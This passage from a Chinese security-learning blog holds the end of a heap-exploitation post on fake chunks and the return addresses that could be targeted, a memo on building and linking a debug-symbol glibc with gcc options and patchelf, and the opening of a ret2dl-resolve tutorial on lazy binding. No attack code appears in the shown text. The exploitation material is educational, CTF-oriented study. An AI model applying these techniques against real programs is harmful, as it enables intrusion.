<p>问题就来了,本堆块的<code>size</code>是不能确定的,本堆块是一个假堆块,很可能是一个非常大的数</p>
<p>导致<code>p+p.size</code>指向非法内存区域,导致<code>(p + p.size)-&gt;size</code>解引用失败,导致程序崩溃</p>
<p>现在考虑我们可能的受害者返回地址</p>
<p>main ret2 libc_start_main</p>
<p>libc_start_main ret2 start</p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
    <link itemprop="mainEntityOfPage" href="http://deutschball.github.io/2024/10/17/%E8%B0%83%E8%AF%95Glibc/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="https://raw.githubusercontent.com/DeutschBall/picbed/main/dustball.png">
      <meta itemprop="name" content="dustball">
      <meta itemprop="description" content="dustland">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="dustland">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2024/10/17/%E8%B0%83%E8%AF%95Glibc/" class="post-title-link" itemprop="url">glibc 相关备忘</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>
              

              <time title="Created: 2024-10-17 23:20:00 / Modified: 23:25:26" itemprop="dateCreated datePublished" datetime="2024-10-17T23:20:00+08:00">2024-10-17</time>
            </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h1 id="源码调试glibc">源码调试Glibc</h1>
<h2 id="系统自带glibc的缺点">系统自带glibc的缺点</h2>
<p>在我们尝试观察延迟绑定机制时,</p>
<p>需要观察_dl_runtime_resolve和dl_fixup这两个函数</p>
<p>这两个函数都位于ld-linux.so.2 动态库中</p>
<p>默认情况下使用gcc编译程序时,动态链接的glibc动态库文件,都在/lib下</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">root@Destroyer:/usr/src/CTF-All-In-One/src/writeup/<span class="number">6.1</span><span class="number">.3</span>_pwn_xdctf2015_pwn200<span class="meta"># ldd /bin/cat</span></span><br><span class="line">        linux-vdso.so<span class="number">.1</span> (<span class="number">0x00007fffee15a000</span>)</span><br><span class="line">        libc.so<span class="number">.6</span> =&gt; /lib/x86_64-linux-gnu/libc.so<span class="number">.6</span> (<span class="number">0x00007f36b527b000</span>)</span><br><span class="line">        /lib64/ld-linux-x86<span class="number">-64.</span>so<span class="number">.2</span> (<span class="number">0x00007f36b5875000</span>)</span><br><span class="line">root@Destroyer:/usr/src/CTF-All-In-One/src/writeup/<span class="number">6.1</span><span class="number">.3</span>_pwn_xdctf2015_pwn200<span class="meta"># ldd ./test</span></span><br><span class="line">        linux-gate.so<span class="number">.1</span> (<span class="number">0xf7f33000</span>)</span><br><span class="line">        libc.so<span class="number">.6</span> =&gt; /lib/i386-linux-gnu/libc.so<span class="number">.6</span> (<span class="number">0xf7d3b000</span>)</span><br><span class="line">        /lib/ld-linux.so<span class="number">.2</span> (<span class="number">0xf7f35000</span>)</span><br></pre></td></tr></table></figure>
<table>
<colgroup>
<col style="width: 12%" />
<col style="width: 46%" />
<col style="width: 40%" />
</colgroup>
<thead>
<tr>
<th></th>
<th>libc</th>
<th>ld</th>
</tr>
</thead>
<tbody>
<tr>
<td>32位程序</td>
<td>/lib/i386-linux-gnu/libc.so.6</td>
<td>/lib/ld-linux.so.2</td>
</tr>
<tr>
<td>64位程序</td>
<td>/lib/x86_64-linux-gnu/libc.so.6</td>
<td>/lib64/ld-linux-x86-64.so.2</td>
</tr>
</tbody>
</table>
<p>这是安装ubuntu这种发行版时系统自带的glibc-release版</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">root@Destroyer:/lib/i386-linux-gnu<span class="meta"># file ld-2.27.so</span></span><br><span class="line">ld<span class="number">-2.27</span>.so: ELF <span class="number">32</span>-bit LSB shared object, Intel <span class="number">80386</span>, version <span class="number">1</span> (SYSV), dynamically linked, BuildID[sha1]=<span class="number">8</span>da666988713e9bb88f4eb5d27dc35d815cf006b, stripped</span><br></pre></td></tr></table></figure>
<p>可以看到调试符号信息已经被strip了</p>
<p>就算我们编译一个c程序时加入了-g选项,也只是保留了程序领空内的所有符号信息,该程序链接的glibc照样是没有调试符号的</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">gef➤  info sharedlibrary</span><br><span class="line">From        To          Syms Read   Shared Object Library</span><br><span class="line"><span class="number">0xf7fd6ab0</span>  <span class="number">0xf7ff18bb</span>  Yes (*)     /lib/ld-linux.so<span class="number">.2</span></span><br><span class="line"><span class="number">0xf7df4690</span>  <span class="number">0xf7f414b6</span>  Yes (*)     /lib/i386-linux-gnu/libc.so<span class="number">.6</span></span><br><span class="line">(*): Shared library is missing debugging information.</span><br></pre></td></tr></table></figure>
<p>两个库都标着*,意思是缺乏调试信息</p>
<p>如果我们想要调试glibc,或者说能够保留glibc中的符号,比如函数名,变量名之类,需要带有符号的glibc</p>
<p>可以自己编译一个玩</p>
<p>以我的wsl kali-linux为例,装机自带的libc版本号是2.38</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">┌──(dustball㉿Destroyer)-[~]</span><br><span class="line">└─$ ldd --version</span><br><span class="line"><span class="title function_">ldd</span> <span class="params">(Debian GLIBC <span class="number">2.38</span><span class="number">-13</span>)</span> 2.38</span><br><span class="line"><span class="title function_">Copyright</span> <span class="params">(C)</span> 2023 Free Software Foundation, Inc.</span><br><span class="line">This is <span class="built_in">free</span> software; see the source <span class="keyword">for</span> copying conditions.  There is NO</span><br><span class="line">warranty; not even <span class="keyword">for</span> MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.</span><br><span class="line">Written by Roland McGrath and Ulrich Drepper.</span><br></pre></td></tr></table></figure>
<p>下面我们编译一个新的带有调试符号的2.38版本的glibc</p>
<h2 id="编译64位glibc">编译64位glibc</h2>
<h3 id="下载glibc">下载glibc</h3>
<p>首先下载glibc源码</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">apt install glibc-source</span><br></pre></td></tr></table></figure>
<p>执行完后会在/usr/src下面生成glibc目录</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿Destroyer)-[/usr/src/glibc]</span><br><span class="line">└─# ls</span><br><span class="line">debian  glibc-2.38.tar.xz</span><br></pre></td></tr></table></figure>
<blockquote>
<p>这个方法不太靠谱，我在另一台机器的wsl上这样整，缺少texinfo源代码</p>
<p>还是到仓库下载源代码稳妥</p>
</blockquote>
<p>或者到glibc仓库<a
target="_blank" rel="noopener" href="http://ftp.gnu.org/gnu/glibc/">http://ftp.gnu.org/gnu/glibc/</a>挑一个下载</p>
<p>或者到镜像仓库下载https://mirrors.aliyun.com/gnu/glibc/</p>
<p>比如</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl http://ftp.gnu.org/gnu/glibc/glibc-2.38.tar.xz -o glibc-2.38.tar.xz</span><br></pre></td></tr></table></figure>
<h3 id="解压glibc">解压glibc</h3>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tar -xf glibc<span class="number">-2.38</span>.tar.xz</span><br></pre></td></tr></table></figure>
<h3 id="建立bulid目录">建立bulid目录</h3>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">cd glibc-2.38</span><br><span class="line">mkdir build</span><br><span class="line">cd build</span><br></pre></td></tr></table></figure>
<h3 id="配置编译选项">配置编译选项</h3>
<p>在build路径下</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">../configure --prefix=/home/glibc/ --enable-add-ons=nptl --with-tls --with-__thread --enable-kernel=2.6.32 --enable-debug --disable-werror </span><br></pre></td></tr></table></figure>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">../configure --prefix=/home/glibc32/glibc-2.38 --enable-add-ons=nptl --with-tls --with-__thread --enable-kernel=2.6.32 --enable-debug --disable-werror </span><br></pre></td></tr></table></figure>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">../configure --prefix=/home/dustball/glibc/glibc-2.35 --enable-add-ons=nptl --with-tls --with-__thread --enable-kernel=2.6.32 --enable-debug --disable-werror</span><br></pre></td></tr></table></figure>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">../configure --prefix=/home/dustball/glibc/glibc-2.27 --enable-add-ons=nptl --with-tls --with-__thread --enable-kernel=2.6.32 --enable-debug --disable-werror</span><br></pre></td></tr></table></figure>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">../configure --prefix=/home/dustball/glibc/glibc-2.31 --enable-add-ons=nptl --with-tls --with-__thread --enable-kernel=2.6.32 --enable-debug --disable-werror</span><br></pre></td></tr></table></figure>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">../configure --prefix=/home/dustball/glibc/glibc-2.35 --enable-add-ons=nptl --with-tls --with-__thread --enable-kernel=2.6.32 --enable-debug --disable-werror</span><br></pre></td></tr></table></figure>
<p>这里<code>--prefix=/home/glibc</code>是决定<code>make install</code>的安装地址</p>
<p><code>–-enable-debug</code>允许调试,实际上就是给gcc传递-g编译选项</p>
<h3 id="编译安装">编译&amp;安装</h3>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">make -j `nproc`</span><br><span class="line">make install</span><br></pre></td></tr></table></figure>
<blockquote>
<p>如果配置编译选项时prefix没有写或者写错了也没关系</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">make install DESTDIR=/home/glibc/</span><br></pre></td></tr></table></figure>
<p>这样安装也可以</p>
</blockquote>
<p>如果编译和安装都没有错误,会在<code>/home/glibc/</code>下生成我们的货</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿Destroyer)-[/home/glibc]</span><br><span class="line">└─<span class="meta"># ls</span></span><br><span class="line">bin  etc  include  lib  libexec  sbin  share  var</span><br></pre></td></tr></table></figure>
<p>动态库在lib下面放着了</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿Destroyer)-[/home/glibc/lib]</span><br><span class="line">└─<span class="meta"># file libc.so.6</span></span><br><span class="line">libc.so<span class="number">.6</span>: ELF <span class="number">64</span>-bit LSB shared object, x86<span class="number">-64</span>, version <span class="number">1</span> (GNU/Linux), dynamically linked, interpreter /home/glibc/lib/ld-linux-x86<span class="number">-64.</span>so<span class="number">.2</span>, BuildID[sha1]=a8ebdd4a75fecb70ba9fe1dc5765fcd87c77742e, <span class="keyword">for</span> GNU/Linux <span class="number">3.2</span><span class="number">.0</span>, with debug_info, not stripped</span><br></pre></td></tr></table></figure>
<p>非常滴漂亮</p>
<h2 id="交叉编译32位glibc可选">交叉编译32位glibc(可选)</h2>
<p>在x86_64 linux上,也兼容32位的程序</p>
<p>如果想要32位带符号glibc的支持,需要再编译一个32位的glibc</p>
<p>下载和解压不用做了,还是利用之前编译64位glibc时的源码即可</p>
<h3 id="建立build32目录">建立build32目录</h3>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">cd glibc<span class="number">-2.38</span></span><br><span class="line">mkdir build32</span><br><span class="line">cd build32</span><br></pre></td></tr></table></figure>
<h3 id="配置32位编译选项">配置32位编译选项</h3>
<p>首先让gcc能够编译32位程序,需要安装一些依赖</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">apt-get install build-essential module-assistant gcc-multilib g++-multilib </span><br></pre></td></tr></table></figure>
<p>然后配置编译选项</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">../configure --prefix=/home/glibc32 --host=i686-pc-linux-gnu --enable-add-ons=nptl --with-tls --with-__thread --enable-kernel=2.6.32 --with-binutils=/usr/bin --with-headers=/usr/include --build=i686-linux-gnu CC=&quot;gcc -m32&quot; CXX=&quot;g++ -m32&quot;</span><br></pre></td></tr></table></figure>
<h3 id="编译安装-1">编译&amp;安装</h3>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">make -j`nproc`</span><br><span class="line">make install</span><br></pre></td></tr></table></figure>
<p>如果编译安装都没有错误,会在/home/glibc32下面生成我们的货</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿Destroyer)-[/home]</span><br><span class="line">└─# ls</span><br><span class="line">dustball  glibc  glibc32</span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿Destroyer)-[/home/glibc32/lib]</span><br><span class="line">└─<span class="meta"># file libc.so.6</span></span><br><span class="line">libc.so<span class="number">.6</span>: ELF <span class="number">32</span>-bit LSB shared object, Intel <span class="number">80386</span>, version <span class="number">1</span> (GNU/Linux), dynamically linked, interpreter /lib/ld-linux.so<span class="number">.2</span>, BuildID[sha1]=<span class="number">3</span>d4a2e7c0e16c8cc778b5bd574a59eb4988e2d96, <span class="keyword">for</span> GNU/Linux <span class="number">3.2</span><span class="number">.0</span>, with debug_info, not stripped</span><br></pre></td></tr></table></figure>
<p>漂亮滴很</p>
<h2 id="编译链接glibc">编译链接glibc</h2>
<p>现在系统里面有两个glibc</p>
<p>一个系统自带的没有调试符号的glibc在/lib下面</p>
<p>一个我们自己编译的有调试符号的glibc在/home/glibc下面</p>
<p>但是天无二日,程序只能链接一个glibc,并且程序默认链接到/lib下的老太阳</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿Destroyer)-[/home/glibc-test]</span><br><span class="line">└─<span class="meta"># ldd main</span></span><br><span class="line">        linux-vdso.so<span class="number">.1</span> (<span class="number">0x00007fff451fb000</span>)</span><br><span class="line">        libc.so<span class="number">.6</span> =&gt; /lib/x86_64-linux-gnu/libc.so<span class="number">.6</span> (<span class="number">0x00007f93106d0000</span>)</span><br><span class="line">        /lib64/ld-linux-x86<span class="number">-64.</span>so<span class="number">.2</span> (<span class="number">0x00007f93108c0000</span>)</span><br></pre></td></tr></table></figure>
<p>如何让程序链接到我们自己编译的glibc呢?</p>
<p>gcc有一个编译选项可以指定链接libc的位置</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gcc main.c -o main -Wl,--rpath=/home/glibc/lib -Wl,--dynamic-linker=/home/glibc/lib/ld-linux-x86-64.so.2   -I/home/glibc/include -g -no-pie</span><br></pre></td></tr></table></figure>
<p><code>-Wl,--rpath=/home/glibc/lib</code>指定glibc路径</p>
<p><code>-Wl,--dynamic-linker=/home/glibc/lib/ld-linux-x86-64.so.2</code>指定动态链接器的路径</p>
<p><code>-I/home/glibc/include</code>指定头文件路径</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿Destroyer)-[/home/glibc-test]</span><br><span class="line">└─# ./main</span><br><span class="line">Hello, world!</span><br><span class="line"></span><br><span class="line">┌──(root㉿Destroyer)-[/home/glibc-test]</span><br><span class="line">└─<span class="meta"># file main</span></span><br><span class="line">main: ELF <span class="number">64</span>-bit LSB executable, x86<span class="number">-64</span>, version <span class="number">1</span> (SYSV), dynamically linked, interpreter /home/glibc/lib/ld-linux-x86<span class="number">-64.</span>so<span class="number">.2</span>, BuildID[sha1]=<span class="number">27284e24</span>ab02fa64103591192dd8b3b006ae20f5, <span class="keyword">for</span> GNU/Linux <span class="number">3.2</span><span class="number">.0</span>, with debug_info, not stripped</span><br><span class="line"></span><br><span class="line">┌──(root㉿Destroyer)-[/home/glibc-test]</span><br><span class="line">└─<span class="meta"># ldd main</span></span><br><span class="line">        linux-vdso.so<span class="number">.1</span> (<span class="number">0x00007ffe18b9d000</span>)</span><br><span class="line">        libc.so<span class="number">.6</span> =&gt; /home/glibc/lib/libc.so<span class="number">.6</span> (<span class="number">0x00007f1a6a9ec000</span>)</span><br><span class="line">        /home/glibc/lib/ld-linux-x86<span class="number">-64.</span>so<span class="number">.2</span> =&gt; /lib64/ld-linux-x86<span class="number">-64.</span>so<span class="number">.2</span> (<span class="number">0x00007f1a6abc6000</span>)</span><br></pre></td></tr></table></figure>
<p>libc和动态链接器都改好了</p>
<p>如果想要编译成32位程序</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gcc main.c -o main -Wl,--rpath=/home/glibc32/lib -Wl,--dynamic-linker=/home/glibc32/lib/ld-linux.so.2   -I/home/glibc/include -g -no-pie -m32</span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿Destroyer)-[/home/glibc-test]</span><br><span class="line">└─# ./main</span><br><span class="line">Hello, world!</span><br><span class="line"></span><br><span class="line">┌──(root㉿Destroyer)-[/home/glibc-test]</span><br><span class="line">└─# ┌──(root㉿Destroyer)-[/home/glibc-test]</span><br><span class="line">└─<span class="meta"># file main</span></span><br><span class="line">main: ELF <span class="number">32</span>-bit LSB executable, Intel <span class="number">80386</span>, version <span class="number">1</span> (SYSV), dynamically linked, interpreter /home/glibc32/lib/ld-linux.so<span class="number">.2</span>, BuildID[sha1]=c2629c0f00b91e2caa60e88d0d27198bc71ff49c, <span class="keyword">for</span> GNU/Linux <span class="number">3.2</span><span class="number">.0</span>, with debug_info, not stripped</span><br><span class="line"></span><br><span class="line">┌──(root㉿Destroyer)-[/home/glibc-test]</span><br><span class="line">└─<span class="meta"># ldd main</span></span><br><span class="line">        linux-gate.so<span class="number">.1</span> (<span class="number">0xf7ef7000</span>)</span><br><span class="line">        libc.so<span class="number">.6</span> =&gt; /home/glibc32/lib/libc.so<span class="number">.6</span> (<span class="number">0xf7cd0000</span>)</span><br><span class="line">        /home/glibc32/lib/ld-linux.so<span class="number">.2</span> =&gt; /lib/ld-linux.so<span class="number">.2</span> (<span class="number">0xf7ef9000</span>)</span><br></pre></td></tr></table></figure>
<p>libc和动态链接器都改好了</p>
<p>此时使用gdb调试程序也是可以看到动态链接器的源码的</p>
<figure>
<img
src="https://raw.githubusercontent.com/DeutschBall/VideoBed/main/image-20240813215802807.png"
alt="image-20240813215802807" />
<figcaption aria-hidden="true">image-20240813215802807</figcaption>
</figure>
<p>也可以看到ld中的符号<code>link_map</code></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; info types link_map</span><br><span class="line">All types matching regular expression <span class="string">&quot;link_map&quot;</span>:</span><br><span class="line"></span><br><span class="line">File ../elf/link.h:</span><br><span class="line"><span class="number">101</span>:    <span class="class"><span class="keyword">struct</span> <span class="title">link_map_public</span>;</span></span><br><span class="line"></span><br><span class="line">File ../include/link.h:</span><br><span class="line"><span class="number">95</span>:     <span class="class"><span class="keyword">struct</span> <span class="title">link_map</span>;</span></span><br><span class="line"><span class="number">286</span>:    <span class="class"><span class="keyword">struct</span> <span class="title">link_map_reldeps</span>;</span></span><br><span class="line"></span><br><span class="line">File ../nptl_db/db_info.c:</span><br><span class="line"><span class="number">40</span>:     <span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">link_map</span> <span class="title">link_map</span>;</span></span><br><span class="line"></span><br><span class="line">File ../sysdeps/x86/linkmap.h:</span><br><span class="line"><span class="number">10</span>:     <span class="class"><span class="keyword">struct</span> <span class="title">link_map_machine</span>;</span></span><br></pre></td></tr></table></figure>
<h2 id="patch-elf修改程序链接glibc">patch-elf修改程序链接glibc</h2>
<p>对于一个已经编译链接完毕,默认链接系统自带glibc的程序,如何让它使用我们编译的glibc呢</p>
<p>可以使用patch-elf修改程序，一是修改libc所在目录的位置，二是修改使用的链接器的绝对地址</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">patchelf --<span class="built_in">set</span>-rpath /home/glibc/lib/ --<span class="built_in">set</span>-interpreter /home/glibc/lib/ld-linux-x86<span class="number">-64.</span>so<span class="number">.2</span> main</span><br></pre></td></tr></table></figure>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿Executor)-[/home/glibc-test]</span><br><span class="line">└─# make main</span><br><span class="line">gcc main.c -o main -no-pie -g -O0</span><br><span class="line"></span><br><span class="line">┌──(root㉿Executor)-[/home/glibc-test]</span><br><span class="line">└─# make ldd</span><br><span class="line">ldd main</span><br><span class="line">        linux-vdso.so.1 (0x00007fff8e1b2000)</span><br><span class="line">        libc.so.6 =&gt; /lib/x86_64-linux-gnu/libc.so.6 (0x00007f02aebae000)</span><br><span class="line">        /lib64/ld-linux-x86-64.so.2 (0x00007f02aedb3000)</span><br><span class="line"></span><br><span class="line">┌──(root㉿Executor)-[/home/glibc-test]</span><br><span class="line">└─# make patch</span><br><span class="line">patchelf --set-rpath /home/glibc/lib/ --set-interpreter /home/glibc/lib/ld-linux-x86-64.so.2 main</span><br><span class="line"></span><br><span class="line">┌──(root㉿Executor)-[/home/glibc-test]</span><br><span class="line">└─# make ldd</span><br><span class="line">ldd main</span><br><span class="line">        linux-vdso.so.1 (0x00007fff70bfc000)</span><br><span class="line">        libc.so.6 =&gt; /home/glibc/lib/libc.so.6 (0x00007f8ab9eef000)</span><br><span class="line">        /home/glibc/lib/ld-linux-x86-64.so.2 =&gt; /lib64/ld-linux-x86-64.so.2 (0x00007f8aba126000)</span><br><span class="line">        </span><br><span class="line">┌──(root㉿Executor)-[/home/glibc-test]</span><br><span class="line">└─# ./main</span><br><span class="line">helloworld</span><br></pre></td></tr></table></figure>
<p>改完了之后ldd观察结果和在编译链接时指定我们的glibc效果是一样的</p>
<p>虽然改完了ld的地址看上去还是指向原来那个<code>/home/glibc/lib/ld-linux-x86-64.so.2 =&gt; /lib64/ld-linux-x86-64.so.2</code></p>
<p>但是调试观察实际上已经改过了</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">gef➤  info sharedlibrary </span><br><span class="line">From                To                  Syms Read   Shared Object Library</span><br><span class="line">0x00007f5aff5a5000  0x00007f5aff5c8f91  Yes         /home/glibc/lib/ld-linux-x86-64.so.2</span><br><span class="line">0x00007f5aff38f3c0  0x00007f5aff4d8c9d  Yes         /home/glibc/lib/libc.so.6</span><br></pre></td></tr></table></figure>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
    <link itemprop="mainEntityOfPage" href="http://deutschball.github.io/2024/10/17/ret2dl-resolve/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="https://raw.githubusercontent.com/DeutschBall/picbed/main/dustball.png">
      <meta itemprop="name" content="dustball">
      <meta itemprop="description" content="dustland">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="dustland">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2024/10/17/ret2dl-resolve/" class="post-title-link" itemprop="url">ret2dl-resolve</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>

              <time title="Created: 2024-10-17 23:19:00" itemprop="dateCreated datePublished" datetime="2024-10-17T23:19:00+08:00">2024-10-17</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">Edited on</span>
                <time title="Modified: 2024-11-23 21:32:09" itemprop="dateModified" datetime="2024-11-23T21:32:09+08:00">2024-11-23</time>
              </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h1 id="ret2dl-resolve">ret2dl-resolve</h1>
<p>在学习这部分之前，最好有带调试符号的libc和ld,</p>
<p>也就是说自己编译一个待调试符号的glibc</p>
<p>然后编译链接程序时指定使用我们的glibc,不用系统自带那个</p>
<p>或者用patchelf把程序链接的glibc调包</p>
<p>然而调试版和发行版调用的函数好像不太一样</p>
<h2 id="延迟绑定">延迟绑定</h2>
<p>假设有程序</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//test.c</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line">    write(<span class="number">1</span>, <span class="string">&quot;Hello, world!\n&quot;</span>, <span class="number">14</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gcc test.c -O0 -g -no-pie -m32 -o test</span><br></pre></td></tr></table></figure>
<p>write函数位于libc.so中，main程序是如何与write符号链接的呢？</p>
<p>这个过程叫做延迟绑定，又叫做懒加载，意思是我们的程序第一次调用动态库中的符号时，动态连接器ld才会解析write函数</p>
<p>这个解析过程如下</p>
<figure>
<img
src="https://raw.githubusercontent.com/DeutschBall/VideoBed/main/%E5%BB%B6%E8%BF%9F%E7%BB%91%E5%AE%9A1.png"
alt="第一次解析" />
<figcaption aria-hidden="true">第一次解析</figcaption>
</figure>
<p>经过第一次解析,write@got被填充了正确的write地址,此后的write调用将如图所示</p>
<figure>
<img
src="https://raw.githubusercontent.com/DeutschBall/VideoBed/main/%E5%BB%B6%E8%BF%9F%E7%BB%91%E5%AE%9A2.png"
alt="此后的调用" />
